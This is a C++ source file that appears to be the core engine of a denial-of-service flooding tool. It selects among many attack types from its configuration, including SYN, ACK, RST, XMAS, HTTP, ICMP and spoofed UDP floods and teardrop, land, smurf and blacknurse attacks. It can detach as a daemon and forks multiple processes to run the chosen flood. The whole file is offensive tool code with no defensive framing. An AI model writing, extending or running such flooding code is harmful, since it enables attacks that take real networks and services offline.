#include "engine.hpp"
#include "icmp_flood.hpp"
#include "spoofed_tcp_flood.hpp"
#include "spoofed_udp_flood.hpp"
#include "tcp_flood.hpp"
#include "udp_flood.hpp"
#include "utils.hpp"

#include <memory>
#include <unistd.h>

Engine &Engine::get() {
  static Engine engine{};
  return engine;
}

void Engine::start() {
  std::unique_ptr<IVector> flood{[&]() -> IVector * {
    switch (Config::get().vec) {
    case TCP_FLOOD:
      return new tcp_flood();
    case UDP_FLOOD:
      return new udp_flood();
    case NULL_TCP:
      return new null_tcp();
    case NULL_UDP:
      return new null_udp();
    case HTTP_FLOOD:
      return new http_flood();
    case ICMP_FLOOD:
      return new icmp_flood();
    case SYN_FLOOD:
      return new syn_flood();
    case ACK_FLOOD:
      return new ack_flood();
    case FIN_FLOOD:
      return new fin_flood();
    case SPOOFED_UDP_FLOOD:
      return new spoofed_udp_flood();
    case TEARDROP:
      return new teardrop();
    case BLACKNURSE:
      return new blacknurse();
    case LAND:
      return new land();
    case SMURF:
      return new smurf();
    case ACK_PSH_FLOOD:
      return new ack_psh_flood();
    case RST_FLOOD:
      return new rst_flood();
    case SYN_ACK:
      return new syn_ack_flood();
    case XMAS_FLOOD:
      return new xmas_flood();
    default:
      spdlog::get("logger")->error("invalid Vector selected");
      exit(EXIT_FAILURE);
    }
  }()};

  if (Config::get().daemonize)
    utils::daemonize();

  for (unsigned int i = 0; i < Config::get().trds; ++i) {
    if (fork())
      flood->run();
  }
}
